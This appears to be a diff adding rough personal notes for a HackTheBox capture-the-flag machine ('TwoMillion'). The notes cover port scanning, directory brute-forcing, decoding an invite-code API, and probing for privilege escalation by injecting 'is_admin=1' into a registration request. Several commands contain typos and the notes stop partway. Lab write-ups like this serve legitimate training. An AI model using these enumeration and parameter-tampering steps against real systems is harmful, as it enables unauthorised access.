@@ -1,0 +1,73 @@
+sudo nmap -p- --min-rate=10000 -oA nmap/twomillion-allports -v 2million.htb
+sudo nmap -sC -sV -p22,80 -oA nmap/twomillion t2m illion.htb
+
+sudo vi /etc/hosts
+<IP address> 2million.htb
+
+feroxbuster -u http://2million.htb/
+
+// open login page on browser
+// check http://2million.htb/login?error=<b>Please subscribe</b>
+// click join htb
+//check inspect -> network tab -> refresh -> debugger -> inviteapi.min.js
+
+// js beautifier
+// put js script in there
+
+curl -X POST 2million.tb/api/v1/invite/how/to/generate
+curl -X POST 2million.tb/api/v1/invite/how/to/generate| jq .
+
+//go to web browser and go to console
+// execute makeInviteCode()
+
+//copy data in Jason 
+
+// go to cyberchef
+// put data in input section and check rot13
+// output was 'In order to generate the invite code, make a POST request to /api/v1/invite/generate'
+
+curl -X POST 2million.htb/api/v1/invite/generate
+curl -X POST 2million.htb/api/v1/invite/generate | jq .
+
+// you will get an <invite code>
+
+echo <invite code> | base64 -d
+
+// get <invite code> decomposed
+
+// another way -> curl -s -q -X POST 2million.htb/api/v1/invite/generate | jq .data.code -r | base64 -d
+
+// go to invite code page and sign up!!
+// fill out information and register
+
+//search anything that seems vulnerable -> access -> get VPN file
+
+//look inside of VPN file and get the domain name
+// change /etc/hosts file 
+
+sudo openvpn <name>.ovpn
+// doesn't connect
+
+// see what happen if you click regenerate and connection pack through burp
+//send to repeater
+
+// check parent directories if I can connect to
+GET /api/v1 HTTP/1.1
+
+curl 2million.htb/api/v1 -H 'Cookie: PHPSESSID=....' | jq .
+
+//check routes
+
+GET api/v1/user/auth
+=> login, not admin
+=> log out
+
+// access /register
+Please subscribe
+admin@ippsec.rocks
+password
+// intercept the request by butp
+//add &is_admin=1
+
+
+
